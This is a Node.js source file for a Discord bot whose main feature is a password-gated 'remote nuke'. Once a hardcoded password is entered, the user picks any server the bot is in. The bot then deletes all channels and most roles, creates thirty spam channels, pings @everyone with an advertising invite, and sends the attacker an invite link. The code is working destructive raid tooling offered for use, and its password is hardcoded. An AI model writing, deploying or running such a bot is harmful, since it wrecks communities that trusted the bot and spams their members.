const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORD
const MAIN_PASSWORD = 'flower2017';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// READY
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  if (content === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 REMOTE NUKE')
      .setDescription('Enter password, then choose server.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// FIXED INTERACTIONS
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    // Button → Modal
    if (interaction.isButton()) {
      const modal = new ModalBuilder()
        .setCustomId(interaction.customId.replace('start', 'modal'))
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
      ));

      return await interaction.showModal(modal);
    }

    // Modal Submit
    if (interaction.isModalSubmit()) {
      const password = interaction.fields.getTextInputValue('password');

      if (password !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
      }

      // Server selector for nuke
      const servers = client.guilds.cache.map(g => ({
        label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
        value: g.id,
        description: `${g.memberCount} members`
      }));

      const menu = new StringSelectMenuBuilder()
        .setCustomId(`fb_server_${userId}`)
        .setPlaceholder('Choose server to NUKE')
        .addOptions(servers);

      const row = new ActionRowBuilder().addComponents(menu);

      await interaction.reply({
        content: '✅ Password correct! Select server to nuke:',
        components: [row],
        ephemeral: true
      });
    }

    // Nuke selected server
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
      await interaction.deferUpdate();

      const guildId = interaction.values[0];
      const guild = client.guilds.cache.get(guildId);

      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });

      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting everything...`, ephemeral: true });

      try {
        // Delete channels
        for (const channel of guild.channels.cache.values()) {
          await channel.delete().catch(() => {});
        }

        // Delete roles
        for (const role of guild.roles.cache.values()) {
          if (role.name === '@everyone' || role.name === 'Owner') continue;
          await role.delete().catch(() => {});
        }

        // Spam "ew" channels
        for (let i = 0; i < 30; i++) {
          await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
        }

        const ewChannel = guild.channels.cache.find(c => c.name === 'ew');
        if (ewChannel) {
          const invite = await ewChannel.createInvite({ maxAge: 0, maxUses: 0 });
          await ewChannel.send(`@everyone\nJoin fame unlocked: discord.gg/fameunlocked`);
          await interaction.user.send(`✅ Raid finished on **${guild.name}**\nInvite: https://discord.gg/${invite.code}`);
        }

        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked! Check your DMs.`, ephemeral: true });
      } catch (err) {
        console.error(err);
        await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
      }
    }
  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong. Try again.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
